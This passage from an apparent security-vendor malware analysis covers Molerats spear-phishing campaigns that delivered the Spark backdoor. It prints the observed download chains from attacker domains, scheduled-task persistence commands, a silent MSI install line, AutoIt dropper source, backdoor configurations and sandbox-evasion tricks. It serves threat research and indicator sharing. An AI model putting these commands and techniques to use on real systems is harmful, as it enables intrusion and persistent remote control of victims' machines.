<td style="width: 8.18182%;">DJ</td>
<td style="width: 13.75%;">Telecom</td>
</tr>
<tr>
<td style="width: 12.1591%;">11/2/2019</td>
<td style="width: 32.6136%;">لعناية معاليكم - المرفق 31-10-2019</td>
<td style="width: 15.4545%;">attachment.doc</td>
<td style="width: 16.3636%;">eaf2ba0d78c0fda..</td>
<td style="width: 8.18182%;">DJ</td>
<td style="width: 13.75%;">Telecom</td>
</tr>
<tr>
<td style="width: 12.1591%;">11/18/2019</td>
<td style="width: 32.6136%;">صورك</p>
<p>&lt;redacted&gt;</p>
<p>مع هبة</td>
<td style="width: 15.4545%;">Pictures.pdf</td>
<td style="width: 16.3636%;">9d6ce7c585609b8..</td>
<td style="width: 8.18182%;">ES</td>
<td style="width: 13.75%;">Gov</td>
</tr>
<tr>
<td style="width: 12.1591%;">11/24/2019</td>
<td style="width: 32.6136%;">مخطط الجهاد الاسلامي لمباغتة اسرائيل وضرب التهدئة</td>
<td style="width: 15.4545%;">Urgent.docx</td>
<td style="width: 16.3636%;">273aa20c4857d98..</td>
<td style="width: 8.18182%;">DJ</td>
<td style="width: 13.75%;">Telecom</td>
</tr>
<tr>
<td style="width: 12.1591%;">12/9/2019</td>
<td style="width: 32.6136%;">محضر اجتماع قيادة المخابرات العامة مع وفد حركة حماس 09-12-2019</td>
<td style="width: 15.4545%;">Urgent.docx</td>
<td style="width: 16.3636%;">273aa20c4857d98..</td>
<td style="width: 8.18182%;">DJ</td>
<td style="width: 13.75%;">Telecom</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 1. Details of spear-phishing emails seen in this attack campaign</em></span></p>
<h2>MOFA Delivery Document</h2>
<p>The first document we collected and analyzed had the filename MOFA- 061019.doc (SHA256: <span style="font-family: 'courier new', courier, monospace;">03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506</span>). This document was password-protected with the password <span style="font-family: 'courier new', courier, monospace;">Abdullah@2019</span>. When opening and supplying the password, the victim was presented with contents that include what appears missing images, as seen in Figure 1.</p>
<figure id="attachment_105135" aria-describedby="caption-attachment-105135" style="width: 2112px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105135" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-9.png" alt="" width="2112" height="936" /><figcaption id="caption-attachment-105135" class="wp-caption-text">Figure 1. Lure image in MOFA delivery document</figcaption></figure>
<p>Once the victim then enabled the embedded macro inside the document, the macro decodes an embedded VBScript (<a href="https://attack.mitre.org/techniques/T1064">T1064</a>) and saves it to<span style="font-family: 'courier new', courier, monospace;"> C:\programdata\Micorsoft\Microsoft.vbs</span>. The Microsoft.vbs script will reach out to the C2 domain <span style="font-family: 'courier new', courier, monospace;">servicebios[.]com</span> to retrieve a second VBScript, which contained additional instructions to then retrieve the payload. The script downloads this secondary VBScript from the following URL and saves it to <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\PlayerVLC.vbs</span>:</p>
<p><span style="font-family: 'courier new', courier, monospace;">https://servicebios[.]com/PlayerVLC.vbs</span></p>
<p>The initial VBScript will then create a scheduled task (<a href="https://attack.mitre.org/techniques/T1053/">T1053</a>) to persistently run the secondary VBScript every minute by running the following command:</p>
<p><span style="font-family: 'courier new', courier, monospace;">schtasks /create /sc minute /mo 1 /tn PlayerVLC /F /tr C:\ProgramData\PlayerVLC.vbs</span></p>
<p>The secondary VBScript attempts to download the executable payload from the following URL and saves it to <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\PlayerVLC.msi</span>.</p>
<p><span style="font-family: 'courier new', courier, monospace;">https://servicebios[.]com/PlayerVLC.msi</span></p>
<p>After downloading the executable payload, the secondary VBScript runs the following command on the command line (<a href="https://attack.mitre.org/techniques/T1059">T1059</a>) to kill any existing msiexec.exe process instances and use the ping application to sleep for two seconds before using the legitimate msiexec.exe application (<a href="https://attack.mitre.org/techniques/T1218/">T1218</a>) to launch the downloaded <span style="font-family: 'courier new', courier, monospace;">PlayerVLC.msi file</span>:</p>
<p><span style="font-family: 'courier new', courier, monospace;">%comspec% /c taskkill /F /IM msiexec.exe &amp; ping 127.0.0.1 -n 2 &gt;NUL &amp; msiexec /i C:\ProgramData\PlayerVLC.msi /quiet /qn /norestart</span></p>
<p>Unfortunately, we were unable to obtain the <span style="font-family: 'courier new', courier, monospace;">PlayerVLC.msi file</span>, as it was no longer hosted by the C2 server. This highlights the benefits of a modular payload that requires a chain of successful communications with a C2 server for a successful infection, as it makes post-intrusion analysis difficult. This type of modular payload and chained C2 requests is fairly common, as we have seen it in use by various adversaries such as DarkHydrus and Sofacy. This behavior can assist the adversary in evading automated defenses, as they can deploy their infrastructure at time of attack and avoid having additional artifacts available for further analysis.</p>
<h2>Attachment Delivery Document</h2>
<p>The Word document delivered on October 31 and November 2, 2019 (SHA256: <span style="font-family: 'courier new', courier, monospace;">eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000</span>) had a filename of attachment.doc and attempted to trick the recipient into clicking the “Enable Content” button to run an embedded macro. Figure 2 shows the lure image used in an attempt to trick the recipient into clicking the “Enable Content” button. These documents were not password-protected, unlike the MOFA delivery documents previously discussed.</p>
<figure id="attachment_105137" aria-describedby="caption-attachment-105137" style="width: 1666px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105137" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-10.png" alt="" width="1666" height="720" /><figcaption id="caption-attachment-105137" class="wp-caption-text">Figure 2. Lure image in Attachment delivery document</figcaption></figure>
<p>The macro is quite simple, as it attempts to download a base64 encoded executable from the following Google Drive URL that it will decode and save to <span style="font-family: 'courier new', courier, monospace;">%TEMP%\rundll64.exe<span style="font-family: georgia, palatino, serif;">:</span></span></p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxps://drive.google[.]com/uc?export=download&amp;id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH</span></p>
<p>The decoded executable (SHA256: <span style="font-family: 'courier new', courier, monospace;">7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128P</span>) is a compiled AutoIt script that installs an embedded executable to <span style="font-family: 'courier new', courier, monospace;">%userprofile%\runawy.exe</span> and runs it. Before exiting, the AutoIt script also makes sure the executable will persistently run by copying the executable to the startup directory and by creating a scheduled task by running the following command:</p>
<p><span style="font-family: 'courier new', courier, monospace;">SCHTASKS /Create /f /SC minute /TN "runawy" /mo 5 /tr "%userprofile%\runawy.exe"</span></p>
<p>The runawy.exe file (SHA256:<span style="font-family: 'courier new', courier, monospace;">64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431</span>) is a payload packed with Enigma that creates a mutex of “S4.4P”. This payload is a packed variant of the Spark backdoor, which has been exclusively linked to Molerats. We will discuss the Spark backdoor’s functionality in detail later in this blog, but this specific sample has the following configuration:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"sIt":"nysura[.]com","QrU":"/","JJDF":80,"MJOu":0,"TuS":"","pJhC":1,"Lm":"NMRm3AlaGUeT2g9iA2lNTIk04vSj8r2IBUDEvItgOxw=","LPO":10000}</span></p>
<h2>Pictures PDF Delivery Document</h2>
<p>Unlike the prior two Word documents discussed, we observed a PDF document named “Pictures.pdf” (SHA256:<span style="font-family: 'courier new', courier, monospace;">9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495</span>) attached to an email with a subject of صورك &lt;redacted&gt; مع هبة, which roughly translates from Arabic to “Your filthy pictures with Heba”. The PDF document does not attempt to exploit a vulnerability, rather it contains a message meant to coerce the recipient into clicking a link to install the actor’s payload. Also, unlike the Word delivery documents that used finesse lure images and missing content in an attempt to trick the user into enabling macros, this PDF document uses a more brash approach that contained a blackmail-esque message in an attempt to trick the user into clicking a link, opening a RAR archive and running an executable.</p>
<p>The message within the PDF document is in Arabic and suggests the sender has compromising pictures of the recipient that they will release to the media. The message also suggests the document was sent to an associate of a government official and was meant to threaten the victim into clicking a link within the document. Figure 3 shows the contents within the PDF document.</p>
<figure id="attachment_105139" aria-describedby="caption-attachment-105139" style="width: 1879px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105139" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-11.png" alt="Spark backdoor delivery" width="1879" height="1234" /><figcaption id="caption-attachment-105139" class="wp-caption-text">Figure 3. Screenshot of the contents of the malicious PDF document</figcaption></figure>
<p>The link within the document is in Arabic and roughly translates to “<span style="font-family: 'courier new', courier, monospace;">A small sample of your filthy pictures with Heba” and “Pictures</span>”. The link points to the following URL, which is case sensitive:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxps://zmartco[.]com/Pictures.rar</span></p>
<p>The "Pictures.rar" file (SHA256: <span style="font-family: 'courier new', courier, monospace;">1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da</span>) is a RAR archive that contains one file with a filename of هذه عينة قليلة من الصور.exe (SHA256: <span style="font-family: 'courier new', courier, monospace;">92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7</span>), which roughly translates to "This is a few sample photos.exe". The executable is a compiled AutoIt script that extracts an embedded executable, saves it to disk at <span style="font-family: 'courier new', courier, monospace;">C:\Users\Public\pdf.exe (<span style="font-family: georgia, palatino, serif;">SHA256:</span> 5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3</span>) and creates a shortcut in <span style="font-family: 'courier new', courier, monospace;">Start Menu\Programs\Startup\pdf.lnk</span> to automatically start it each time the system starts, as seen here:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6719b55811d7b953683472" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#NoTrayIcon
FileInstall("pdf.exe", "C:\Users\Public\" &amp; "/pdf.exe")
$cmd1 = "C:\Users\Public\" &amp; "\pdf.exe"
RunWait(@ComSpec &amp; " /c start " &amp; $cmd1, "", @SW_HIDE)
FileCreateShortcut("C:\Users\Public\" &amp; "\pdf.exe", @StartupDir &amp; 
"\pdf.lnk")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6719b55811d7b953683472-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6719b55811d7b953683472-2">2</div><div class="crayon-num" data-line="crayon-6719b55811d7b953683472-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6719b55811d7b953683472-4">4</div><div class="crayon-num" data-line="crayon-6719b55811d7b953683472-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6719b55811d7b953683472-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6719b55811d7b953683472-1"><span class="crayon-p">#NoTrayIcon</span></div><div class="crayon-line crayon-striped-line" id="crayon-6719b55811d7b953683472-2"><span class="crayon-e">FileInstall</span><span class="crayon-sy">(</span><span class="crayon-s">"pdf.exe"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Users\Public\" &amp; "</span>/<span class="crayon-i">pdf</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">")</span></div><div class="crayon-line" id="crayon-6719b55811d7b953683472-3"><span class="crayon-s">$cmd1 = "</span><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-i">Users</span><span class="crayon-sy">\</span><span class="crayon-m">Public</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-s">"\pdf.exe"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6719b55811d7b953683472-4"><span class="crayon-e">RunWait</span><span class="crayon-sy">(</span><span class="crayon-sy">@</span><span class="crayon-i">ComSpec</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-s">" /c start "</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">cmd1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-i">SW_HIDE</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-6719b55811d7b953683472-5"><span class="crayon-e">FileCreateShortcut</span><span class="crayon-sy">(</span><span class="crayon-s">"C:\Users\Public\" &amp; "</span><span class="crayon-sy">\</span><span class="crayon-i">pdf</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">", @StartupDir &amp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-6719b55811d7b953683472-6"><span class="crayon-s">"</span><span class="crayon-sy">\</span><span class="crayon-i">pdf</span><span class="crayon-sy">.</span><span class="crayon-i">lnk</span>"<span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Like the “<span style="font-family: georgia, palatino, serif;">runawy.exe</span>” payload delivered by the attachment.doc Word document, the "pdf.exe" file saved to the system is a packed variant of the Spark backdoor. This variant of the backdoor had the following configuration:</p>
<p><span style="font-family: 'courier new', courier, monospace;">{"xBql":"laceibagrafica[.]com","eauy":"/","Qnd":80,"jJN":0,"rlOa":"","Eb":1,"BGa":"vcJbq6nzgJk=","qJk":10000}</span></p>
<h2>Delivery Infrastructure</h2>
<p>Often when investigating attacks like these, links between infrastructure used across distinct campaigns can be easily found, such as by tracking reused IP addresses or domains, finding related domains sharing similar attributes, and so on. In the case of all the MOFA-related delivery documents listed in Table 1, <span style="font-family: 'courier new', courier, monospace;">servicebios[.]com</span> was the only domain used, and most of the infrastructure information related to historical usage.</p>
<p>With the AutoFocus Threat Intelligence service, we used alternative data points provided from our cloud sandbox, WildFire, during the analysis of said malicious documents in order to pivot and discover additional samples and related infrastructure. In this section we will discuss the methods we used and describe the additional infrastructure.</p>
<p>Figure 4 below is a maltego chart showing the Word documents and Visual Basic Script (vbs) files related to the <span style="font-family: 'courier new', courier, monospace;">servicebios[.]com</span> domain in the bottom half of the chart, with some of the related entities connected via one of two links, to other entities in the top half of the chart. Said links include Yara signatures in the blue box and an AutoFocus query in the orange box, as indicated by the “AF” for AutoFocus.</p>
<figure id="attachment_105175" aria-describedby="caption-attachment-105175" style="width: 600px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/Figure-4.-Chart-showing-relationships-between-delivery-documents-and-associated-infrastructure.png" rel="wpdevart_lightbox"><img decoding="async" class="wp-image-105175" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/Figure-4.-Chart-showing-relationships-between-delivery-documents-and-associated-infrastructure.png" alt="Spark backdoor delivery of documents" width="600" height="804" /></a><figcaption id="caption-attachment-105175" class="wp-caption-text">Figure 4. Chart showing relationships between delivery documents and associated infrastructure</figcaption></figure>
<p>The AutoFocus query relates to a specific process execution chain leading to a Windows Scripting Host process (wscript.exe) launching the malicious VBS downloader scripts. This allowed us to pivot on behavioural artefacts from the “MOFA- 101019.doc” (SHA256: <span style="font-family: 'courier new', courier, monospace;">ddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8</span>) document to previously unknown documents “التقرير اليومي حول أهم المستجدات الفلسطينية ليوم - 9 - 9 - 2019.doc” (Daily report on the most important Palestinian developments, 9-9-2019.doc; SHA256: <span style="font-family: 'courier new', courier, monospace;">feec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21</span>) and “التقرير اليومي حول أخر مستجدات الإرهاب العالمي- 9 - 9 - 2019.doc” (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc; SHA256: <span style="font-family: 'courier new', courier, monospace;">bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959</span>).</p>
<p>As with the original Word document, the VBA macro code inside the new documents also used the open-source code “Base64 decode VBS function” from <a href="https://www.motobit.com/tips/detpg_Base64/">Motobit</a> to decode (<a href="https://attack.mitre.org/techniques/T1027/">T1027</a>) the download function and URL to VBS before running it. The main difference between the VBS files is the domain - <span style="font-family: 'courier new', courier, monospace;">dapoerwedding[.]com</span> - where the secondary VBS payload was hosted. At the time of this activity the domain resolved to <span style="font-family: 'courier new', courier, monospace;">45.15.168[.]118</span> and was used in a previous campaign from September 2019.</p>
<p>In parallel to searching for related files using behavioural commonalities, we authored Yara signatures for the VBS code associated with the original delivery document, to scan our and VirusTotal’s corpus. This led to two additional VBS files: SHA256: <span style="font-family: 'courier new', courier, monospace;">85631021d7e84dc466b23cf77dd949ebc61011a52c1f0fb046cfd62dd9192a15</span> represents the 1st stage VBS downloader containing minor changes to the domain and filename used, as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">https://dapoerwedding[.]com/GoogleChrome.vbs</span></p>
<p>The second VBS file discovered (SHA256: <span style="font-family: 'courier new', courier, monospace;">9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7</span>) is the 2nd stage VBS downloader with reference to the final MSI file payload, which was unavailable at the time of writing:</p>
<p><span style="font-family: 'courier new', courier, monospace;">https://dapoerwedding[.]com/GoogleChrome.msi</span></p>
<p>We were also able to discover additional Word documents using other AutoFocus queries, as highlighted by the two other AutoFocus “AF'' orange boxes in Figure X above. These maltego entities query our data using proprietary hashes calculated from the original document’s VBA macro code, and resulted in SHA256: <span style="font-family: 'courier new', courier, monospace;">602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb (servicebios[.]com)</span>, and SHA256s: <span style="font-family: 'courier new', courier, monospace;">a2c68da1b3e0115f5804a55768b2baf50faea81f13a16e563411754dc6c0a8ff</span> and <span style="font-family: 'courier new', courier, monospace;">4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba (dapoerwedding[.]com</span>).</p>
<p>Upon initial inspection of <span style="font-family: 'courier new', courier, monospace;">dapoerwedding[.]com</span> and <span style="font-family: 'courier new', courier, monospace;">servicebios[.]com</span>, nothing stood out as having ties to previously documented Molerats activity, however there were some commonalities (<a href="https://attack.mitre.org/techniques/T1347/">T1347</a>) between the two domains:</p>
<ol>
<li>Pre-existing domains</li>
<li>Seemingly legitimate historical content</li>
<li>Recently expired (and lapsed domain redemption grace period)</li>
<li>Post-expiry registrant (<a href="https://attack.mitre.org/techniques/T1328/">T1328</a>) is NameCheap, Inc.</li>
<li>Domain Validation (DV) SSL Certificates setup (<a href="https://attack.mitre.org/techniques/T1337/">T1337</a>), issued by Sectigo</li>
</ol>
<p>Another delivery domain - <span style="font-family: 'courier new', courier, monospace;">zmartco[.]com</span> - that shares the same commonalities listed above pertains to the “Pictures.pdf” delivery attachment listed in Table 1 discussed in the previous section.</p>
<h2>Spark Payload Related to Operation Parliament</h2>
<p>The executables installed by the compiled AutoIt scripts is a backdoor that Molerats has used in many attack campaigns. Until recently, this backdoor did not have its own moniker, but <a href="https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one">Cybereason recently gave this backdoor a name of “Spark”</a>. As mentioned in Cybereason’s blog, the Spark backdoor was also delivered in attacks occurring in January 2019, as discussed in a <a href="https://ti.360.net/blog/articles/suspected-molerats-new-attack-in-the-middle-east-en/">blog published by Qi</a>hoo 360. Based on our research, the Spark backdoor has been used by Molerats since at least early 2017, as it was the main payload in the Operation Parliament campaign reported by Kaspersky.</p>
<p>Spark uses HTTP POST requests to communicate with its C2 server to receive commands and to exfiltrate the results, all of which using JSON-structured messages. In most cases, the threat actors use commercial packers to obfuscate the Spark payload to avoid detection. During our research, we have seen the actors use the Enigma protector, Themida and VMProtect, which makes identifying samples difficult. We were also able to identify two different versions of Spark-based identifiers left in the binaries by the developer, which are version 2.2 and 4.2. Based on the compilation times of the files with the Spark samples with identifiable version strings, it appears that version 2.2 was created in 2017, while version 4.2 was created in late December 2019 and January 2020. Table 2 shows these Spark samples that contained version numbers, along with their compile time and the packer used to obfuscate their contents.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 157.153px;"><strong>Truncated SHA256</strong></td>
<td style="width: 64.9306px;"><strong>Version</strong></td>
<td style="width: 148.264px;"><strong>Compiled</strong></td>
<td style="width: 77.1528px;"><strong>Packer</strong></td>
</tr>
<tr>
<td style="width: 157.153px;">966ad6452793b15..</td>
<td style="width: 64.9306px;">2.2</td>
<td style="width: 148.264px;">2017-05-24 6:15:04</td>
<td style="width: 77.1528px;">VMProtect</td>
</tr>
<tr>
<td style="width: 157.153px;">ab4e43b4e526d44..</td>
<td style="width: 64.9306px;">2.2</td>
<td style="width: 148.264px;">2017-05-24 6:15:04</td>
<td style="width: 77.1528px;">VMProtect</td>
</tr>
<tr>
<td style="width: 157.153px;">212aa6e3f236550..</td>
<td style="width: 64.9306px;">2.2</td>
<td style="width: 148.264px;">2017-05-24 6:15:04</td>
<td style="width: 77.1528px;">VMProtect</td>
</tr>
<tr>
<td style="width: 157.153px;">cf32479ed30ae95..</td>
<td style="width: 64.9306px;">4.2</td>
<td style="width: 148.264px;">2019-12-30 9:45:44</td>
<td style="width: 77.1528px;">none</td>
</tr>
<tr>
<td style="width: 157.153px;">d0dc1de0ae912c7..</td>
<td style="width: 64.9306px;">4.2</td>
<td style="width: 148.264px;">2020-01-12 10:57:50</td>
<td style="width: 77.1528px;">Enigma</td>
</tr>
<tr>
<td style="width: 157.153px;">04fa6aaea5e3a26..</td>
<td style="width: 64.9306px;">4.2</td>
<td style="width: 148.264px;">2020-01-12 10:57:50</td>
<td style="width: 77.1528px;">Enigma</td>
</tr>
<tr>
<td style="width: 157.153px;">6e60f5c65299ee7..</td>
<td style="width: 64.9306px;">4.2</td>
<td style="width: 148.264px;">2020-01-12 10:57:50</td>
<td style="width: 77.1528px;">Enigma</td>
</tr>
<tr>
<td style="width: 157.153px;">b08b8fddb9dd940..</td>
<td style="width: 64.9306px;">4.2</td>
<td style="width: 148.264px;">2020-01-12 10:57:50</td>
<td style="width: 77.1528px;">Enigma</td>
</tr>
<tr>
<td style="width: 157.153px;">64ea1f1e0352f3d..</td>
<td style="width: 64.9306px;">4.2</td>
<td style="width: 148.264px;">2020-01-12 10:57:50</td>
<td style="width: 77.1528px;">Enigma</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 2. Spark samples with their version number, compile time and the packer used</em></span></p>
<p>We have collected dozens of Spark payloads, whose compile times range from March 2017 to January 2020, which further suggests this group has been using this backdoor in attack campaigns for almost three years. We extracted the configurations from each of these files to gather the known C2 domains associated with Spark, which we have included in Table 3.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 226.042px;"><strong>Domain</strong></td>
<td style="width: 101.597px;"><strong>First used</strong></td>
</tr>
<tr>
<td style="width: 226.042px;">webtutorialz[.]com</td>
<td style="width: 101.597px;">1st Half 2020</td>
</tr>
<tr>
<td style="width: 226.042px;">nysura[.]com</td>
<td style="width: 101.597px;">1st Half 2020</td>
</tr>
<tr>
<td style="width: 226.042px;">laceibagrafica[.]com</td>
<td style="width: 101.597px;">2nd Half 2019</td>
</tr>
<tr>
<td style="width: 226.042px;">motoqu[.]com</td>
<td style="width: 101.597px;">2nd Half 2019</td>
</tr>
<tr>
<td style="width: 226.042px;">smartweb9[.]com</td>
<td style="width: 101.597px;">1st Half 2019</td>
</tr>
<tr>
<td style="width: 226.042px;">laptower[.]com</td>
<td style="width: 101.597px;">2nd Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">app.msexchanges16[.]com</td>
<td style="width: 101.597px;">2nd Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">msexchange13[.]com</td>
<td style="width: 101.597px;">2nd Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">cloudserviceapi[.]online</td>
<td style="width: 101.597px;">2nd Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">updates.masterservices[.]online</td>
<td style="width: 101.597px;">2nd Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">clients.itresolver[.]online</td>
<td style="width: 101.597px;">1st Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">update.itresolver[.]online</td>
<td style="width: 101.597px;">1st Half 2018</td>
</tr>
<tr>
<td style="width: 226.042px;">91.219.237[.]99</td>
<td style="width: 101.597px;">2nd Half 2017</td>
</tr>
<tr>
<td style="width: 226.042px;">goldenlines[.]site</td>
<td style="width: 101.597px;">2nd Half 2017</td>
</tr>
<tr>
<td style="width: 226.042px;">update.nextdata[.]site</td>
<td style="width: 101.597px;">2nd Half 2017</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 3. Spark C2 domains and the approximate time they were used</em></span></p>
<p>In the next section, we will explain Spark’s capabilities and demonstrate its C2 channel that we determined from our analysis of the “pdf.exe” payload delivered by the Pictures.pdf document in the November 2019 attack.</p>
<h2>Spark Payload in Pictures.pdf November 2019 Attack</h2>
<p>The Spark payload installed by the compiled AutoIt script is packed with the commercial <a href="https://enigmaprotector.com/">Enigma protector</a> (<a href="https://attack.mitre.org/techniques/T1045/">T1045</a>). When packing the payload, the actor used a feature within Enigma protector called <a href="https://enigmaprotector.com/en/help/manual/3fb53859f328dbe43332a934a9054fd1">“Splash Screen”</a>, which the actor configured to display an image on top of all the windows and waits for the user to click the image before executing the malicious code. Figure 5 shows the splash image displayed by the Enigma protector prior to executing the malicious payload, which is a wallpaper image <a href="https://wallpaperswide.com/windows_10_hero_4k-wallpapers.html">available at wallpaperswide.com</a>. The splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.</p>
<figure id="attachment_105143" aria-describedby="caption-attachment-105143" style="width: 2500px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-105143" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/word-image-13.png" alt="Spark backdoor malicious PDF" width="2500" height="1501" /><figcaption id="caption-attachment-105143" class="wp-caption-text">Figure 5. Screenshot of the contents of the malicious PDF document</figcaption></figure>
<p>Once unpacked, we found the Spark payload was similar to the payloads delivered in Operation Parliament from a capability perspective. The Spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.</p>
<p>The payload starts by checking the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word "arabic". If the word is not found in the results of these two API calls, the payload does not execute any of its malicious code. Checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actor’s targeted victim would be configured.</p>
<p>After the payload confirms that the system has the appropriate keyboard and language pack installed for the actor’s desired target, it will begin attempting to communicate with a C2 server specified within a configuration embedded within the payload. The embedded configuration is encrypted and the payload decrypts it by first using a custom rolling XOR algorithm to decrypt a key and a buffer of ciphertext, resulting in a key and ciphertext that appears encoded with base64. It will then generate the SHA256 hash of the base64 encoded key and use the fourth through the 28th bytes of the resulting hash as the final key. The payload will base64 decode the ciphertext and use the final key to decrypt the decoded ciphertext using Triple DES (3DES), which results in a configuration that is structured in JSON. This particular payload had the keys and values seen in Table 3 below.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td><strong>JSON Field</strong></td>
<td><strong>JSON Value</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>xBql</td>
<td>laceibagrafica[.]com</td>
<td>Hostname of C2 server</td>
</tr>
<tr>
<td>eauy</td>
<td>/</td>
<td>URI of C2 server</td>
</tr>
<tr>
<td>Qnd</td>
<td>80</td>
<td>TCP port for C2 server</td>
</tr>
<tr>
<td>jJN</td>
<td>0</td>
<td>Sleep interval before entering the main C2 communications loop.</td>
</tr>
<tr>
<td>rlOa</td>
<td>&lt;empty string&gt;</td>
<td>Unknown and does not appear to be used.</td>
</tr>
<tr>
<td>Eb</td>
<td>1</td>
<td>Unknown purpose, but sent to the C2 in the BrandentlK field</td>
</tr>
<tr>
<td>BGa</td>
<td>vcJbq6nzgJk=</td>
<td>Hardcoded base64 encrypted string, which is the “Nickname” field likely used as a campaign identifier</td>
</tr>
<tr>
<td>qJk</td>
<td>10000</td>
<td>Number of iterations of the main C2 communications loop before exiting the application.</td>
</tr>
</tbody>
</table>
